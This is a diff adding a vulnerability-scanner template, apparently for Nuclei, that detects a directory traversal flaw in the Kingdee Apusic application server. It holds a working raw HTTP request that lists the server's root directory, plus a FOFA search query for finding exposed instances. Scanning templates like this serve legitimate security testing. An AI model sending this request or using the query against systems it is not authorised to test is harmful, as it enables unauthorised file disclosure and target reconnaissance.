@@ -1,0 +1,36 @@
+id: kingdee-apusic-serverfile-fileread
+info:
+  name: 金蝶 Apusic 应用服务器 serverfile/server_file - fileread
+  author: leadlife
+  severity: high
+  description: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E8%9D%B6OA%20Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8(%E4%B8%AD%E9%97%B4%E4%BB%B6)%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"
+  tags: kingdee,apusic,fileread
+
+http:
+  - raw:
+      - |
+        GET /admin/protected/selector/server_file/files?folder=/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "name"
+          - "etc"
+          - "usr"
+          - "lib"
+          - "root"
+          - "bin"
+          - "home"
+        condition: and
+
+      - type: status
+        status:
+          - 200
